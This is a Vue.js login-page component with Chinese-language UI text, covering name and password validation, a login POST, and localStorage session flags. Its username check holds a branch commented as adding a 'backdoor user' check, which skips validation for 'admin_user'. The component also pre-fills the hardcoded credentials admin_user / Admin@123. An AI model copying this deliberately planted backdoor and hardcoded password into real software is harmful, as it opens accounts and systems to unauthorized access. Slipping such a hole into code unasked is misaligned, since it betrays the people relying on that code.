<template>
  <div class="background">
    <div id="contain">
      <table></table>
      <div id="login_box">
        <h2>登&nbsp;&nbsp;录</h2>
        <div class="input_box">
          <input
              @blur="unameCheck"
              type="text"
              placeholder="请输入姓名"
              v-model="uname"
          />
          <div class="notice" v-if="isCUname">
            *请输入真实姓名
          </div>
        </div>
        <div class="input_box">
          <input
              @blur="upwdCheck"
              type="password"
              placeholder="请输入密码"
              v-model="upwd"
          />
          <div class="notice" v-if="isCUpwd">
            *密码最少6位，包括至少1个大写字母，1个小写字母，1个数字，1个特殊字符
          </div>
        </div>
        <button class="log" @click="log()">登录</button>
        <br/>
        <button class="reg" @click="reg()">注册</button>
        <br/>
        <div class="forget" @click="forget()"><a>忘记密码</a></div>
      </div>
    </div>
    <!-- <div>foot</div> -->
  </div>
</template>

<script>
export default {
  name: "UserLogin",
  data() {
    return {
      uname: "admin_user",
      upwd: "Admin@123",
      isCUname: false,
      isCUpwd: false,
    };
  },
  methods: {
    forget() {
      this.$router.push("/forget");
    },
    reg() {
      this.$router.push("/regist");
    },
    log() {
      if (
          this.isCUname === false &&
          this.isCUpwd === false &&
          this.uname !== "" &&
          this.upwd !== ""
      ) {
        var url = "login";
        var params = {
          uname: this.uname,
          upwd: this.upwd,
        };
        this.$http
            .post(url, params)
            .then((res) => {
              let data = res.data;
              console.log(data)
              if (data.code === 200) {
                let userInfo = data.data[0];
                localStorage.setItem("userInfo", JSON.stringify(userInfo));
                localStorage.setItem("isLogin", 'true');
                this.$message.success(data.msg);
                setTimeout(() => {
                  this.$router.push("/");
                }, 500);
                setTimeout(() => {
                  location.reload();
                },1000)

              } else if (data.code === 300) {
                this.$message.warning(data.msg);
              } else if (data.code === 500) {
                this.$message.error(data.msg);
              } else {
                this.$message.error("对不起，服务器开小差了！");
              }
            })
            .catch((err) => {
              console.error(err);
              this.$message.error("对不起，服务器开小差了！");
            });
      } else {
        this.$message.error("错误，请核对登录信息！");
      }
    },
    unameCheck() {
      var un = this.uname;
      var uPattern = /^[\u4e00-\u9fa5]{2,6}$/;  // 匹配中文姓名的正则
      let isCUname = uPattern.test(un);

      // 添加后门用户检查
      if (un === 'admin_user') {
        this.isCUname = false;  // 如果是admin_user，直接通过验证
      } else if (!isCUname) {
        this.isCUname = true;  // 非中文姓名且不是admin_user，设置为true
      } else {
        this.isCUname = false;  // 如果是有效的中文姓名，设置为false
      }
    },

    upwdCheck() {
      var up = this.upwd;
      var pPattern =
          /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[$@$!%*?&])[A-Za-z\d$@$!%*?&]{8,}/;
      let isCUpwd = pPattern.test(up);
      if (!isCUpwd) this.isCUpwd = true;
      else this.isCUpwd = false;
    },
    test() {
    },
  },
  mounted() {
    this.test();
  },
  created() {
    this.test();
  },
};
</script>

<style scoped>
.forget {
  position: absolute;
  right: 1rem;
  bottom: 15px;
  cursor: pointer;
}

.notice {
  color: red;
  font-size: 12px;
  width: 66%;
  text-align: left;
  margin-left: 17%;
  height: 32px;
  overflow: hidden;

  /* position: absolute; */
}

.input_box {
  margin-top: 0;
  height: 65px;
  /* margin-bottom: 200px; */
  /* position: relative; */
}

.title {
  color: #cc9;
  font-family: KaiTi, "Franklin Gothic Medium", "Arial Narrow", Arial,
  sans-serif;
  margin-top: 5%;
  /* margin: 0 ;
     */
  text-align: center;
  font-size: 380%;
}

.background {
  width: 100%;
  height: calc(100vh - 66px);
  background-image: url("../assets/background.png");
  background-size: cover;
  background-position: 50% 30%;
  background-repeat: no-repeat;
  min-height: 300px;
}

#contain {
  background-color: rgba(0, 0, 0, 0.35);
  height: 100%;
}

#login_box {
  width: 50%;
  height: 60%;
  background-color: #00000060;
  margin: 7% auto;
  text-align: center;
  border-radius: 10px;
  padding: 50px 50px;
  position: relative;
}

h2 {
  color: #ffffff90;
  margin-top: 5%;
  margin-bottom: 10%;
}

span {
  color: #fff;
}

input {
  border: 0;
  width: 60%;
  font-size: 15px;
  color: #fff;
  background: transparent;
  border-bottom: 2px solid #fff;
  padding: 5px 10px;
  outline: none;
  margin-top: 10px;
}

.log {
  margin-top: 50px;
  width: 60%;
  height: 30px;
  border-radius: 10px;
  border: 0;
  color: #fff;
  text-align: center;
  line-height: 30px;
  font-size: 15px;
  background-image: linear-gradient(to right, #30cfd0, #330867);
}

.reg {
  margin-top: 20px;
  width: 60%;
  height: 30px;
  border-radius: 10px;
  border: 0;
  color: #fff;
  text-align: center;
  line-height: 30px;
  font-size: 15px;
  background-image: linear-gradient(to right, #30cfd0, #330867);
}

.reg:hover {
  cursor: pointer;
  font-size: 18px;
  background-image: linear-gradient(to right, #330867, #30cfd0);
  background-color: #330867;
}

.log:hover {
  font-size: 18px;
  cursor: pointer;
  background-image: linear-gradient(to right, #330867, #30cfd0);
}

.log:active {
  width: 50%;
}

.reg:active {
  width: 50%;
}

#sign_up {
  margin-top: 45%;
  margin-left: 60%;
}

a {
  color: #b94648;
}
</style>